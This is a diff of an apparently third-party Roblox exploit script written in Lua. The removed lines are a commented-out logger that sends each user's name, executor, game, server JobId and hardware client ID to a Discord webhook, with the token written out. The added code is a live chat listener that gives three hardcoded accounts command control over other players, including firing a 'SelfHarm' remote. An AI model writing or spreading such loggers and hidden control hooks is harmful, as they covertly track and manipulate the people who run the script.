@@ -1,14 +1,13 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local WEBHOOK = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"
-local EXECUTOR = identifyexecutor()
-local EXECUTOR_TEXT = ""
+local Admins = {
+	["goldenchicayfredyy"] = true,
+	["nopitching"] = true,
+	["1049c4"] = true,
+}
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
---[[local function FindUser(Name)
+local function FindUser(Name)
 	if #Name < 3 then
 		return nil
 	end
@@ -39,76 +38,25 @@ local commands = {
 
 		game:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("Other"):WaitForChild("SelfHarm"):FireServer(unpack(args))
 	end,
-}]]
-
-
---[[if EXECUTOR == "Wave" then
-	EXECUTOR_TEXT = "Wave"
-elseif EXECUTOR == "Solara" then
-	EXECUTOR_TEXT = "Solara"
-elseif EXECUTOR == "Celery" then
-	EXECUTOR_TEXT = "Celery"
-elseif EXECUTOR == "Synapse Z" then
-	EXECUTOR_TEXT = "Synapse Z"
-else
-	EXECUTOR_TEXT = "Unknown"
-end
-
-local embed = {
-	["title"] = LocalPlayer.Name,
-	["color"] = 0x2f5bc7,
-	["fields"] = {
-		{
-			["name"] = "Executor",
-			["value"] = EXECUTOR_TEXT,
-			["inline"] = true
-		},
-		{
-			["name"] = "Game",
-			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-			["inline"] = true
-		},
-		{
-			["name"] = "JobId",
-			["value"] = game.JobId,
-			["inline"] = true
-		},
-		{
-			["name"] = "HWID",
-			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-			["inline"] = true
-		}
-	}
 }
 
-local payload = {
-	["embeds"] = {embed},
-}
-
-local httpRequest = {
-	Url = WEBHOOK,
-	Method = "POST",
-	Headers = {
-		["Content-Type"] = "application/json"
-	},
-	Body = game:GetService("HttpService"):JSONEncode(payload)
-}
-
-request(httpRequest)]]
-
---[[game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Chatted:Connect(function(Msg)
-	local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
-	if not command then
-		command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
+game:GetService("Players").PlayerAdded:Connect(function(player)
+	if Admins[player.Name] then
+		player.Chatted:Connect(function(Msg)
+			local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
+			if not command then
+				command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
+			end
+			if command and commands[command] then
+				local targetPlayer = FindUser(target)
+				if targetPlayer then
+					commands[command](targetPlayer)
+				else
+					return
+				end
+			elseif not commands[command] then
+				return
+			end
+		end)
 	end
-	if command and commands[command] then
-		local targetPlayer = FindUser(target)
-		if targetPlayer then
-			commands[command](targetPlayer)
-		else
-			return
-		end
-	elseif not commands[command] then
-		return
-	end
-end)]]
+end)
